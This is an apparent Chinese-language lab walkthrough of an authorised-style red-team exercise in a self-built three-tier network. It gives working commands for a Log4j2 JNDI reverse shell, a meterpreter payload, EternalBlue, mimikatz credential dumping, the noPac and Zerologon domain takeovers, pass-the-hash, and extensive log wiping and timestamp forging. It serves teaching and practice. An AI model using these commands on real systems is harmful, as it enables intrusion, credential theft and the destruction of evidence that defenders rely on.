![wallhaven-47m1xy](https://image.3001.net/images/20221122/1669128509_637ce13d8641e06c22f0c.jpg!small)

本次多层网络域渗透项目旨在模拟红队攻击人员在授权情况下对目标进行渗透，从外网打点到内网横向穿透，最终获得整个内网权限的过程，包含Log4j2漏洞，MS17-010，CVE-2020-1472，CVE-2021-42287/CVE-2021-42278以及一些痕迹清理的思路等等。

文中若有不当之处，还望各位大佬多多点评。

 **请注意：**

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

## 测试环境搭建

目标：获取域控服务器权限，拿到三个flag。

### 网络拓扑图

整个环境共三台目标机器，分别处在三层网络环境中：

DMZ区环境处在192.168.254.1/24网段；

第二层网络环境处在10.0.1.1/24网段；

第三层网络环境处在10.0.0.1/24网段；

DMZ区域的主机可以连通外网，其余网段主机均不可与外网连接。

![image-20221122223220720](https://image.3001.net/images/20221122/1669128510_637ce13ea252466ea5739.png!small)

### 用户 / 主机信息

 **kali**

ip：192.168.254.130

 **ubantu16**

ip：192.168.254.131 10.0.1.6

user：saul

pass：Saul123

 **域控**

ip：10.0.0.12

hostname：AD

user : Administrator

pass : ASDqwe123

 **域个人机器**

ip：10.0.1.7 10.0.0.7

hostname：win7

本地用户：hong：密码空

域账户：redteam/root:Red12345

## 信息收集

### 端口扫描/服务探测

    
    
    nmap -sV -A  -T4 -p- 192.168.254.131

![image-20221122214323213](https://image.3001.net/images/20221122/1669128511_637ce13f8c9bd0bcefa8c.png!small)

该主机开启了22，38080端口，38080端口扫描到存在web服务，尝试访问。

![image-20221122214327425](https://image.3001.net/images/20221122/1669128513_637ce14143932e3f05447.png!small)

## 漏洞探测利用

### 漏洞探测

这里可以使用burp插件检测到存在Log4j2漏洞。

Log4j2漏洞探测payload： dnlog盲打。

    
    
    curl 192.168.254.131:38080/hello -X POST -d 'payload=${jndi:ldap://k8v66b,dnslog.cn/aa}'

![image-20221122214331745](https://image.3001.net/images/20221122/1669128514_637ce1421f3bb06ae5de4.png!small)

![image-20221122214334665](https://image.3001.net/images/20221122/1669128515_637ce14306afc3257e1fe.png!small)

### 漏洞利用

利用Log4j2-RCE获得shell JNDI命令注入。

JNDI注入利用工具，

开启LDAP服务，

    
    
    java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.68.254.130

![image-20221122214338696](https://image.3001.net/images/20221122/1669128515_637ce143eebe7b0dee389.png!small)

同时开启nc监听，

    
    
    nc -lvnp 9999

![image-20221122214341718](https://image.3001.net/images/20221122/1669128516_637ce144e7269ae810a8f.png!small)

构造payload：

    
    
    ldap://127.0.0.1:1389/TomcatBypass/Command/Base64/[base64_encoded_cmd]

填入实际参数并编码

    
    
    ## bash一句话反弹shell  
    bash -i >& /dev/tcp/192.168.254.130/9999 0>&1  
    ​  
    ## base64编码  
    YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMzAvOTk5OSAwPiYx  
    ​  
    ## url编码+号  
    YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMzAvOTk5OSAwPiYx  
    ​  
    ## 构造payload  
    curl 192.168.254.131:38080/hello -X POST -d 'payload=${jndi:ldap://192.168.254.130:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%252bJiAvZGV2L3RjcC8xOTIuMTY4LjI1NC4xMzAvOTk5OSAwPiYx}'

![image-20221122214348316](https://image.3001.net/images/20221122/1669128517_637ce145c7c987c4ca015.png!small)

![image-20221122214351844](https://image.3001.net/images/20221122/1669128518_637ce146d1bdc76e11fed.png!small)

### Docker

![image-20221122214354752](https://image.3001.net/images/20221122/1669128519_637ce147e4a3358300971.png!small)

发现一些问题，猜测可能是docker环境，验证如下：

    
    
    cat /proc/1/cgroup

![image-20221122214357958](https://image.3001.net/images/20221122/1669128520_637ce148cc24521932f55.png!small)

Docker runC漏洞逃逸，版本太高。

runc < 1.0-rc6 (Docker < 18.09.2) ，版本太高。

![image-20221122214401601.png](https://image.3001.net/images/20221122/1669128521_637ce149cb9b1776b6c7c.png!small)

容器也未设置privileged特权模式。

![image-20221122214409642](https://image.3001.net/images/20221122/1669128522_637ce14ae3e2bc34fe215.png!small)

在容器中发现一个flag

/root/flag.txt

![image-20221122214413955](https://image.3001.net/images/20221122/1669128523_637ce14bcb441f1a55234.png!small)

给出了一个账号密码，

使用ssh尝试远程连接，

![image-20221122214418002](https://image.3001.net/images/20221122/1669128524_637ce14c994a8e8e132ee.png!small)

  

![image-20221122214421463](https://image.3001.net/images/20221122/1669128525_637ce14dc65c5bd367412.png!small)

发现一个内网地址10.0.1.6

上传fscan

搭建http服务：

    
    
    python -m http.server 8081

![image-20221122214425137](https://image.3001.net/images/20221122/1669128527_637ce14f2b10ecd9a27cb.png!small)

在ssh连接的shell上执行

    
    
    wget 192.168.254.130:8081/fscan_amd64

![image-20221122214427597](https://image.3001.net/images/20221122/1669128527_637ce14fdfffd65ffead2.png!small)

    
    
    ./fscan_amd64 -h 10.0.1.1/24

直接执行的话会报权限不够，要先赋予权限

    
    
    chmod +x fscan_amd64

![image-20221122214432218](https://image.3001.net/images/20221122/1669128529_637ce15100a9e542a1973.png!small)

![image-20221122214435005](https://image.3001.net/images/20221122/1669128529_637ce151f28e630390aff.png!small)

### MSF上线

制作MSF马：

    
    
    msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.254.130 lport=4444 -f elf -o shell

![image-20221122214440658](https://image.3001.net/images/20221122/1669128531_637ce15343eecdb337c98.png!small)

然后MSF执行

    
    
    use exploit/multi/handler  
    set payload linux/x86/meterpreter/reverse_tcp

![image-20221122214447315](https://image.3001.net/images/20221122/1669128532_637ce15436123c00e9396.png!small)

![image-20221122214450048](https://image.3001.net/images/20221122/1669128533_637ce15508bd5588fa477.png!small)

远程执行，反弹shell

![image-20221122214454116](https://image.3001.net/images/20221122/1669128533_637ce155d9a6968cf98aa.png!small)

## 内网渗透

### 代理转发

frps.ini

    
    
    [common]  
    bind_addr = 0.0.0.0        # 设置监听的ip ，一般是你的外网ip，0.0.0.0表示都监听  
    bind_port = 8000           # 监听的端口，等待客户端连接   
    dashboard_addr = 0.0.0.0   # frp网站服务器的ip，可以访问登录  
    dashboard_port = 7600       # frp网站服务器的端口，可以访问登录  
    dashboard_user = root       # frp网站服务账号  
    dashboard_pwd  = 123456    # frp网站服务密码  
    token = 1q2w3e             # 客户端的连接密码  
    heartbeat_timeout = 90     # 连接超时的时间  
    max_pool_count = 5         # 允许连接的客户端数量

frpc.ini

    
    
    [common]  
    tls_enable = true  
    server_addr = 192.168.254.130         # vps 服务器地址   
    server_port = 8000          # vps服务器监听地址  
    token = 1q2w3e              # 设置的密码 ，设置完流量加密，不好解。        
    pool_count = 5            # 将提前建立连接，默认值为 0  
    protocol = tcp              # 通信方式  
    health_check_type = tcp    # frpc 将连接本地服务的端口以检测其健康状态  
    health_check_interval_s = 100   # 健康检查时间间隔  
    [proxies]  
    remote_port = 6000  # 把流量转发到vps 那个端口 ，这个是重点等下会用到  
    plugin = socks5        #plugin 表示为插件   
    use_encryption = true     
    use_compression = true

攻击机：

    
    
    ./frps -c ./frps.ini

![image-20221122214500314](https://image.3001.net/images/20221122/1669128534_637ce156d43dd24e620cf.png!small)

ssh远程机器上：

    
    
    sudo ./frpc -c ./frpc.ini

![image-20221122214504127](https://image.3001.net/images/20221122/1669128536_637ce1581b86b7d8d32c4.png!small)

### MS17-010

上面fscan扫描时已经发现了存在MS17-010漏洞 10.0.1.7

设置代理

    
    
    setg Proxies socks5:127.0.0.1:6000            # 设置代理  
    set ReverseAllowProxy true                    # 允许反向连接

扫描漏洞

    
    
    search ms17-010  
    use auxiliary/scanner/smb/smb_ms17_010  # 选择扫描模块  
    show options  # 查看模块配置  
    set rhost 10.0.1.7 # 选择攻击ip  
    run  

![image-20221122214507864](https://image.3001.net/images/20221122/1669128537_637ce15946942f21c1ce4.png!small)

验证存在，尝试进行攻击测试

    
    
    search ms17-010  
    use exploit/windows/smb/ms17_010_eternalblue    #攻击测试  
    set payload windows/x64/meterpreter/bind_tcp    #这里正向使用的是正向shell，是基于我们可以访问到对方，也可以使用reverse_tcp  
    set rhosts 10.0.1.7    #选择攻击ip  
    set target 1    #这里我们将target进行设置为win7的，有时候不设置会攻击不成功，查看所有target的命令是：show targets  
    run/exploit

![image-20221122214511726](https://image.3001.net/images/20221122/1669128538_637ce15a4248ddf017f96.png!small)

![image-20221122214516190](https://image.3001.net/images/20221122/1669128540_637ce15c3f070c530e2eb.png!small)

通过MS7-010攻击成功

### 域信息收集

尝试输入一些命令发现存在乱码

![image-20221122214520190](https://image.3001.net/images/20221122/1669128541_637ce15dec428a51c83b8.png!small)

输入

`chcp 65001`修改编码

    
    
    systeminfo

![image-20221122214523708](https://image.3001.net/images/20221122/1669128542_637ce15ee6b9a2f4faadb.png!small)

    
    
    net config workstation     # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域  
    net user /domain     # 查看域用户  
    net view /domain     # 查看有几个域  
    net group /domain     # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）  
    net group "domain admins" /domain     # 查看域管理员的名字  
    net group "domain computers" /domain     # 查看域中的其他主机名  
    net group "domain controllers" /domain     # 查看域控制器（可能有多台）  
    ​  
    for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1|find /i "ttl="     # 查找域控ip  
    nslookup redteam.lab    # 查找域控ip

![image-20221122214527391](https://image.3001.net/images/20221122/1669128544_637ce16050f77c742a87a.png!small)

域控IP极有可能为10.0.0.12

### 主机密码收集

抓取用户密码

    
    
    load mimikatz  
    creds_all

![image-20221122214531048](https://image.3001.net/images/20221122/1669128545_637ce161bbdcb83f10c64.png!small)

![image-20221122214533903](https://image.3001.net/images/20221122/1669128547_637ce163379526670f090.png!small)

成功抓取到域用户root的账号及密码

![image-20221122214537458](https://image.3001.net/images/20221122/1669128548_637ce16480aa9c8ac7719.png!small)

  

## 域渗透

### 添加路由

使用代理之前，我们需要先添加路由，让MSF能够到达目标机器内网。因为这里socks模块只是将代理设置为监听的端口（默认是1080），即通过proxychains的流量都转给本地的1080端口，又因为是MSF起的监听端口，所以通过代理走的流量也能到达内网

    
    
    use auxiliary/server/socks_proxy

![image-20221122214545694](https://image.3001.net/images/20221122/1669128549_637ce165d9fb5f2c0a204.png!small)

添加10.0.0.0/24的路由

![image-20221122214551449](https://image.3001.net/images/20221122/1669128550_637ce166d182df5baff4e.png!small)

![image-20221122214554926](https://image.3001.net/images/20221122/1669128552_637ce1681d72903ea4ef0.png!small)

修改/etc/proxychains4.conf

    
    
    sock5 0.0.0.0 1080

![image-20221122214558118](https://image.3001.net/images/20221122/1669128553_637ce1692a252c739f194.png!small)

###  **CVE-2021-42287/CVE-2021-42278**

CVE-2021-42278利用AD域计算机账户认证漏洞，使用计算机账户的sAMAccountName冒充域控制器，结合CVE-2021-42287可以获取Kerberos特权属性证书
(PAC)，从而使域内普通用户权限提升至域管理员权限。

* * *

如果获得了DC用户的TGT票据且域内有一台名为DC$域控，再将DC用户删除，此时使用该TGT去请求s4u2self，如果域控制器账户DC$存在，那么DC就能获得域控制器账户（机器用户DC$）的ST票证。

假如域内有一台域控名为 DC（域控对应的机器用户为 DC$），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户
saulGoodman$，再把机器用户 saulGoodman$ 的 sAMAccountName 改成 DC。然后利用 DC 去申请一个TGT票据。再把
DC 的sAMAccountName 改为 saulGoodman$。这个时候 KDC 就会判断域内没有 DC 和这个用户，自动去搜索
DC$（DC$是域内已经的域控DC 的 sAMAccountName），攻击者利用刚刚申请的 TGT 进行 S4U2self，模拟域内的域管去请求域控 DC
的 ST 票据，最终获得域控制器DC的权限。

  

![image-20221122214617574](https://image.3001.net/images/20221122/1669128554_637ce16a3c768ca8e2b98.png!small)

如果想要深入了解具体原理的话可以去看看其他文章

* * *

攻击机不在域内，但是可以访问域控

该漏洞利用只需要一个域用户账户即可拿到 DC 的控制权限

有两种自动化脚本

#### ##攻击靶场

#### sam-the-admin.py

工具链接：<https://github.com/WazeHell/sam-the-admin>

该脚本在kali环境中运行，使用前先安装依赖包：`pip3 install -r requirements.txt`

获取shell

参考：python3 sam_the_admin.py "main/testuser:p@55word" -dc-ip 192.168.43.100
-shell

![image-20221122214623885](https://image.3001.net/images/20221122/1669128555_637ce16b41d1cb6df78e8.png!small)

    
    
    proxychains python3 sam_the_admin.py "redteam/root:Red12345" -dc-ip 10.0.0.12 -shell

  

![image-20221122214627720](https://image.3001.net/images/20221122/1669128556_637ce16c51a6e1710bdcf.png!small)

注意：获取shell是通过impacket包中的smbexec.py，获取HASH是通过impacket包中的secretsdump.py，在sam-the-admin.py中有如下定义：

    
    
    fbinary = "/usr/bin/impacket-smbexec"  
    if options.dump:  
    fbinary = "/usr/bin/impacket-secretsdump"

其中smbexec.py的路径是/usr/bin/impacket-smbexec，secretsdump.py的路径是/usr/bin/impacket-secretsdump，如果系统环境中这两个脚本不是此路径，则需要将其调用路径进行修改。

另外，虽然sam-the-admin.py帮助文档中有提到获取HASH和HASH传递认证方式，但是测试中都没有执行成功。

  

#### noPac.py

在sam-the-admin.py的基础上改进，工具链接：<https://github.com/Ridter/noPac>

工具使用前先安装依赖包：pip3 install -r requirements.txt

获取Shell

参考：python3 noPac.py -use-ldap main.test.com/testuser:p@55word -dc-ip
192.168.43.100 -shell

![image-20221122214632049](https://image.3001.net/images/20221122/1669128557_637ce16d7f539a252b835.png!small)

    
    
    proxychains python3 noPac.py -use-ldap redteam/root:Red12345 -dc-ip 10.0.0.12 -shell

  

![image-20221122214635160](https://image.3001.net/images/20221122/1669128559_637ce16f36cb75ff681ba.png!small)

注意log信息中提示Current ms-DS-MachineAccountQuota = 10，表示普通用户新建计算机账户上限为10
(10是默认值，如果修改为0则表示无法新建计算机账户，漏洞利用会失败)，工具运行后会尝试将执行过程中新建的计算机账户删掉，但是只有域管权限才可以成功删除，因此在使用普通域用户权限时，每执行一次都会新建一个计算机账户，当数量达到上限10，漏洞利用会失败。

 **获取HASH**

    
    
    python3 noPac.py -use-ldap main.test.com/testuser:p@55word -dc-ip 192.168.43.100 -dump -just-dc-ntlm

![image-20221122214638830](https://image.3001.net/images/20221122/1669128560_637ce170760eaff697a16.png!small)

认证方式支持HASH传递

    
    
    python3 noPac.py -use-ldap main.test.com/testuser -hashes :52888cf384b8d2e56e0cc2bb6b906f99 -dc-ip 192.168.43.100 -dump -just-dc-ntlm

  

#### 漏洞修复

##### 补丁更新

<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287>

<https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278>

##### 临时防护措施

通过 域控的ADSI编辑器工具将AD的MAQ 配置为0，可中断此漏洞利用链

![image-20221122214709392](https://image.3001.net/images/20221122/1669128561_637ce1719c4debef89f20.png!small)

  

### CVE-2020-1472

该漏洞也被称为“Zerologon”，号称“3秒撸域控”

攻击者在通过NetLogon（MS-NRPC）协议与AD域控建立安全通道时，可利用该漏洞将AD域控的计算机账号密码置为空，从而控制域控服务器。

![image-20221122214712930](https://image.3001.net/images/20221122/1669128562_637ce172c682543bef005.png!small)

  

#### ##攻击靶场

    
    
    域控  
    ip：10.0.0.12  
    hostname：DC  
    user : Administrator  
    pass : ASDqwe123  
    域：redteam.lab

#### 检测漏洞是否存在

使用mimikatz

    
    
    lsadump::zerologon /target:10.0.0.12 /account:DC$

  

![image-20221122214809380](https://image.3001.net/images/20221122/1669128563_637ce1738dcfd72cc3bb8.png!small)

显示OK，Vulnerable存在该漏洞，接下来进行利用!

#### 置空

    
    
    proxychains python3 cve-2020-1472-exploit.py DC 10.0.0.12

![image-20221122214812249](https://image.3001.net/images/20221122/1669128564_637ce174bfa3fba47b67b.png!small)

#### dumphash

    
    
    proxychains python3 secretsdump.py -no-pass -just-dc -just-dc-user administrator redteam.lab/DC$\@10.0.0.12

![image-20221122214815092](https://image.3001.net/images/20221122/1669128565_637ce175c21ca2229b823.png!small)

#### PTH

`proxychains python3 wmiexec.py redteam.lab/Administrator\@10.0.0.12 -hashes
:88e4d9f............b29`这里不方便复制省略了

![image-20221122214817915](https://image.3001.net/images/20221122/1669128567_637ce1771b838639bacfd.png!small)

#### 解决编码问题：

    
    
    proxychains python3 wmiexec.py redteam.lab/Administrator\@10.0.0.12 -codec 'gbk' -hashes :88e4d9f............b29

![image-20221122214820935](https://image.3001.net/images/20221122/1669128568_637ce1783cfb6422fb410.png!small)

  

####  **恢复**

注意：get这里如果使用impacket包中的wmiexec.py脚本的话无法正常执行get命令，可以更换wmiexec.py脚本

reg save HKLM\SYSTEM system.save

reg save HKLM\SAM sam.save

reg save HKLM\SECURITY security.save

get system.save

get sam.save

get security.save

del system.save

del sam.save

del security.save

![image-20221122214824170](https://image.3001.net/images/20221122/1669128569_637ce1797ee1ea489ab91.png!small)

下载完会在kali的当前目录中存有下载下来的三个文件，然后本地执行。

    
    
    proxychains python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

![image-20221122214826680](https://image.3001.net/images/20221122/1669128570_637ce17ae8318ae32ef0f.png!small)

    
    
    proxychains python3 restorepassword.py redteam.red/owa\@owa -target-ip 10.10.10.8 -hexpass caffc4a02a2040858392e5909c5f0e528de461f22d3d0b7b6aed6b5a3544b1ea4f229155f11b2ed358b49c4db0d0f6fdc55139b6887f6184f380d41a1d2d1d75d4532c163d3ebe2b4b83ca0af27714cc4b8b312bc627ac6ffb8c489ece0fbb88f8a274f3e14a0aa70e2b2508a6dff8fffcc8825d8191835cc9cd7784cc88628ac44eb1baa9c8ee0438c3d49c953a59c52d24d09f31da9cef79e56b31d19d8c4257caac83062da4432b9b23d64312aca238c98b2b8808ed652f17c1a75b81059928bf4a8f5e9334cc0c37f07e74863902055b0e8b18de02d2d0dac450d51fd6e13639bc7ef887f244a7c298695284575b  
    参考上面代码

![image-20221122214829673](https://image.3001.net/images/20221122/1669128572_637ce17cb573dd5bbba67.png!small)

    
    
    proxychains python3 restorepassword.py redteam.lab/DC\@DC -target-ip 10.0.0.12 -hexpass   ....................

![image-20221122214832273](https://image.3001.net/images/20221122/1669128574_637ce17e14bcca3d313f7.png!small)

![image-20221122214834899](https://image.3001.net/images/20221122/1669128575_637ce17f0ec33499774e9.png!small)

至此，密码恢复完成。

## 痕迹清理

### Windows

    
    
    windows主机日志全量清理：   
    PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"  
    ​  
    防火墙日志清理：  
    cd logfiles/firewall   
    del xxx.log

日志清理主要分为全量清理和定向清理，全量清理可以提升被溯源反制的难度，但其动作较大容易被发现；定向清理相对比较隐蔽，可以增加溯源反制的时间和成本，但可能清理不到位，增加被溯源反制的风险。实战中两者结合运用。注意：日志清理也是系统事件，所以会被记录，不管怎样，不存在完美的痕迹清理。

#### windows主机三大核心日志清理

    
    
    ## 全量清理  
    PowerShell -Command "& {Clear-Eventlog -Log Application,System,Security}"

清理前后：

![image-20221122214840939](https://image.3001.net/images/20221122/1669128576_637ce180276c73d9f6b34.png!small)

#### 防火墙日志清理

    
    
    cd logfiles/firewall  
    del xxx.log

#### 服务器日志清理

    
    
    默认情况，在 %systemroot%\system32\logfles\ 下有FTP、IIS服务器等日志。  
    FTP日志默认位置： %systemroot%\system32\logfiles\msftpsvc1\  
    WWW日志默认位置： %sys temroot%\sys tem32\logfiles\w3svc1\  
    Scheduler服务日志默认位置： %systemroot%\schedlgu.txt  
    DNS日志默认位置： %systemroot%\system32\config  
    如果发现这些日志被重定位，通过注册表 HKEY_LOCAL_MACHINE\sys  
    tem\CurrentControlSet\Services\Eventlog 下很多的子表，查到一些日志的定位目录。

#### 远程连接日志清理

    
    
    # 进入Default.rdp所在路径  
    cd %userprofile%\documents\  
    # 使用attrib去掉Default.rdp文件的，系统文件属性(S)；隐藏文件属性(H)  
    attrib Default.rdp -s -h  
    # 删除  
    del Default.rdp

#### 近期访问记录清理

    
    
    # 用户最近访问过的文件和网页记录  
    C:\Users\root\AppData\Local\Microsoft\Windows\History  
    # 近期访问过的文件  
    C:\Users\root\Recent

#### 安全删除文件

利用cipher覆写文件

    
    
    cipher /w:X # 其中X指盘符或文件具体位置  
    cipher /w:c:\users\root\desktop\flag.txt

#### 安全隐藏文件

Powershell修改文件时间戳

    
    
    Function edit_time($path){$date1 =Get-ChildItem |  
    Select LastWriteTime|Get-Random;$date2 =Get-ChildItem |  
    Select LastWriteTime|Get-Random;$date3 =Get-ChildItem |  
    Select LastWriteTime|Get-Random;$(Get-Item  
    $path).lastaccesstime=$date1.LastWriteTime;  
    $(Get-Item $path).creationtime=$date2.LastWriteTime ;  
    $(Get-Item $path).lastwritetime=$date3.LastWriteTime};  
    edit_time("C:\Users\root\desktop\flag.txt")

### Linux

    
    
    隐藏远程ssh登陆记录：  
    ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i  
    ​  
    清理历史记录：  
    history -c  
    ​  
    当前shell终止history记录：  
    set +o history 、 kill -9 $$  
    ​  
    清理日志：  
    ls -al /var/log/lastlog && echo > /var/log/lastlog && ls -al /var/log/lastlog  
    ​  
    隐藏文件修改时间：  
    touch -r A B (修改系统时间后执行效果更好)

#### 清理历史记录

    
    
    history -c

#### 清理日志文件

    
    
    # 全量清理  
    echo > /var/log/btmp  
    echo > /var/log/lastlog  
    cat /dev/null > /var/log/secure  
    cat /dev/null > /var/log/message  
    # 部分清理  
    sed -i '/你的IP/'d filename  
    # 部分替换  
    sed -i 's/1.1.1.1/2.2.2.2/g' /var/log/nginx/access.log  
    # 例如  
    ls -al /var/log/lastlog && echo > /var/log/lastlog && ls -al /var/log/lastlog

![image-20221122214851626](https://image.3001.net/images/20221122/1669128576_637ce180e1a28d1f2ac80.png!small)

#### 安全删除文件

使用shred覆写文件

    
    
    shred -f -u -z -v -n 6 ew_for_linux64

![image-20221122214855108](https://image.3001.net/images/20221122/1669128577_637ce181b29b74704dbfb.png!small)

## 总结

通过上述过程，我们对比如Log4j2漏洞，MS17-010漏洞，CVE-2020-1472漏洞，CVE-2021-42287/CVE-2021-42278漏洞有了新的认知或者理解，网络安全的学习离不开实际操作，想要搞明白漏洞更是要实际去复现学习。

最后希望大家提高安全意识，没有网络安全就没有国家安全。

